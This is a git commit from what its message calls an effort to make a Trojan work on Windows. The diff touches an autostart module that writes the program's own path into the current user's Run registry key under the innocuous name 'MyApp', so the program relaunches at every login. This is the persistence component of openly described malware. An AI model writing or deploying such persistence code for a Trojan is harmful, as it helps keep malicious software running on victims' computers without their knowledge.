04b0d8c32f16ae2cdfd634e15f443d89327a40f3
Rskladanek <remek.skladanek@wp.pl>
2024-11-24 16:54:05 +0100

    Trying to make Trojan work on Windows

--- modules/autostart.py
+++ modules/autostart.py
@@ -3,7 +3,7 @@ import winreg as reg
 
 def run(**args):
     try:
-        file_path = os.path.abspath(__file__)
+        file_path = os.path.realpath(__file__)
         key = r"Software\Microsoft\Windows\CurrentVersion\Run"
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
             reg.SetValueEx(reg_key, "MyApp", 0, reg.REG_SZ, file_path)
